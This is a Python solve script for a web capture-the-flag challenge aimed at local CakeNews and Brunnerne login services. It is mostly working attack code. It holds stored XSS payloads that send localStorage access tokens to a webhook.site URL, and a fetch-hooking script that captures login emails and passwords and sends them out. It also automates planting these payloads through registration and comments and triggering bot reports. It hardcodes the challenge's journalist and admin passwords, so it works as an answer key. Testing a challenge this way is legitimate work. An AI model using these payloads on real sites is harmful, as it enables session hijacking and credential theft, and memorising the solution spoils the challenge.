# This script can be used to confirm the solution to the challenge as well as test if the challenge actually works. Fill out the webhook_url, cakenews_url, and brunnernelogin_url variables with the appropriate URLs.

import requests

# Webhook.site setup
webhook_url = "https://webhook.site/176492f2-677d-42bf-ac4f-50ddc723107a"

# Challenge URLs
cakenews_url = "http://localhost:1337"
brunnernelogin_url = "http://localhost:1338"

# Journalist credentials
journalist_email = "0xjeppe@cakenews.ctf"
journalist_password = "tubby-obituary-superman-shorten-activism-myself"

# Admin credentials
admin_email = "admin@brunnerne.ctf"
admin_password = "expanse-overbite-tibia-refund-grafting-galore"

# Payloads
journalist_hijack = f"""
"><img src="x" onerror="fetch('{webhook_url}?token=' + localStorage.getItem('cakenewsAccessToken') + '&profile=' + encodeURIComponent(localStorage.getItem('cakenewsUserProfile')))" />
"""

phish_admin = f"""
\"><div class='login-modal'>
  <form action='{webhook_url}'></form>
</div>
<img src='x' onerror=\"
  (function(){{
    try{{
      localStorage.removeItem('cakenewsAccessToken');
      localStorage.removeItem('cakenewsUserProfile');
    }}catch(e){{}}

    var sink='{webhook_url}';
    function exfidl(d){{
      if(!d||!d.email||!d.password) return;
      new Image().src=sink+'?e='+encodeURIComponent(d.email)+'&p='+encodeURIComponent(d.password);
    }}
    var f=window.fetch;
    window.fetch=function(r,i){{
      try{{
        if(i&&typeof i.body==='string'){{
          var data=JSON.parse(i.body); exfidl(data);
        }}
      }}catch(e){{}}
      return f.apply(this,arguments);
    }};
  }})();
\">
"""

import random, string, sys

def register_with_xss():
    """Register a new CakeNews account whose *username* contains the session-
    hijacking payload so that when the journalist bot views our comment the
    XSS fires and leaks its localStorage tokens to webhook.site.
    """

    email = "test@test.dk"
    password = "hej"

    data = {
        "email": email,
        "username": journalist_hijack,
        "password": password,
        "password_confirmation": password,
    }

    r = requests.post(f"{cakenews_url}/api/register", json=data, timeout=5)
    if r.status_code != 201:
        print("[!] registration failed", r.status_code, r.text)
        sys.exit(1)
    print(f"[+] Registered malicious user {email} (pwd: {password})")
    return email, password

def login_with_session_hijack(email, password):
    """Log in to CakeNews and return the bearer token."""
    resp = requests.post(
        f"{cakenews_url}/api/login",
        json={"email": email, "password": password},
        timeout=5,
    )
    if resp.status_code != 200:
        print("[!] login failed", resp.status_code, resp.text)
        sys.exit(1)

    token = resp.json()["token"]
    print(f"[+] Logged in as {email}")
    return token


def post_comment_with_xss(token):
    """Post a comment that contains the XSS payload."""
    payload = {"content": journalist_hijack}
    headers = {
        "Authorization": f"Bearer {token}",
        "Content-Type": "application/json",
    }

    resp = requests.post(
        f"{cakenews_url}/api/articles/1/comments",
        json=payload,
        headers=headers,
        timeout=5,
    )
    if resp.status_code != 201:
        print("[!] posting comment failed", resp.status_code, resp.text)
        sys.exit(1)
    print("[+] Comment posted with XSS payload")

def report_to_journalist(token):
    """Report the article to the journalist."""
    payload = {"article_id": 1}
    headers = {
        "Authorization": f"Bearer {token}",
        "Content-Type": "application/json",
    }
    resp = requests.post(f"{cakenews_url}/api/articles/1/report-journalist", json=payload, headers=headers, timeout=5)
    if resp.status_code != 200:
        print("[!] reporting to journalist failed", resp.status_code, resp.text)
        sys.exit(1)
    print("[+] Reported to journalist")

def register_with_xss_phishing():
    """Register a new CakeNews account whose *username* contains the XSS phishing payload."""
    email = "xss@phishing.com"
    password = "123"
    data = {
        "email": email,
        "username": phish_admin,
        "password": password,
        "password_confirmation": password,
    }
    resp = requests.post(f"{cakenews_url}/api/register", json=data, timeout=5)
    if resp.status_code != 201:
        print("[!] registration failed", resp.status_code, resp.text)
        sys.exit(1)
    print(f"[+] Registered malicious user {email} (pwd: {password})")
    return email, password

def login_with_xss_phishing(email, password):
    """Login with the XSS phishing payload."""
    resp = requests.post(f"{cakenews_url}/api/login", json={"email": email, "password": password}, timeout=5)
    if resp.status_code != 200:
        print("[!] login failed", resp.status_code, resp.text)
        sys.exit(1)
    print("[+] Logged in with XSS phishing payload")
    return resp.json()["token"]

def post_comment_with_xss_phishing(token):
    """Post a comment that contains the XSS phishing payload."""
    payload = {"content": phish_admin}
    headers = {
        "Authorization": f"Bearer {token}",
        "Content-Type": "application/json",
    }
    resp = requests.post(f"{cakenews_url}/api/articles/2/comments", json=payload, headers=headers, timeout=5)
    if resp.status_code != 201:
        print("[!] posting comment failed", resp.status_code, resp.text)
        sys.exit(1)
    print("[+] Comment posted with XSS phishing payload")

def login_as_journalist(email, password):
    """Login as the journalist."""
    resp = requests.post(f"{cakenews_url}/api/login", json={"email": email, "password": password}, timeout=5)
    if resp.status_code != 200:
        print("[!] login failed", resp.status_code, resp.text)
        sys.exit(1)
    print("[+] Logged in as journalist")
    return resp.json()["token"]

def report_to_admin(token):
    """Report the article to the admin."""
    payload = {"article_id": 2}
    headers = {
        "Authorization": f"Bearer {token}",
        "Content-Type": "application/json",
    }
    resp = requests.post(f"{cakenews_url}/api/articles/2/report-admin", json=payload, headers=headers, timeout=5)
    if resp.status_code != 200:
        print("[!] reporting to admin failed", resp.status_code, resp.text)
        sys.exit(1)
    print("[+] Reported to admin")

def login_as_admin(email, password):
    """Login as the admin and return the SSO bearer token."""
    resp = requests.post(
        f"{brunnernelogin_url}/api/login",
        json={"email": email, "password": password},
        timeout=5,
    )
    if resp.status_code != 200:
        print("[!] login failed", resp.status_code, resp.text)
        sys.exit(1)
    token = resp.json()["token"]
    print("[+] Logged in as admin")
    return token

def fetch_admin_profile(token):
    """Fetch the admin profile."""
    headers = {
        "Authorization": f"Bearer {token}",
    }
    resp = requests.get(f"{brunnernelogin_url}/api/profile", headers=headers, timeout=5)
    if resp.status_code != 200:
        print("[!] fetching admin profile failed", resp.status_code, resp.text)
        sys.exit(1)
    print("[+] Fetched admin profile")
    return resp.json()

if __name__ == "__main__":
    email, password = register_with_xss()
    token = login_with_session_hijack(email, password)
    post_comment_with_xss(token)
    report_to_journalist(token)

    email, password = register_with_xss_phishing()
    token = login_with_xss_phishing(email, password)
    post_comment_with_xss_phishing(token)
    token = login_as_journalist(journalist_email, journalist_password)
    report_to_admin(token)

    token = login_as_admin(admin_email, admin_password)
    profile = fetch_admin_profile(token)
    print(profile)
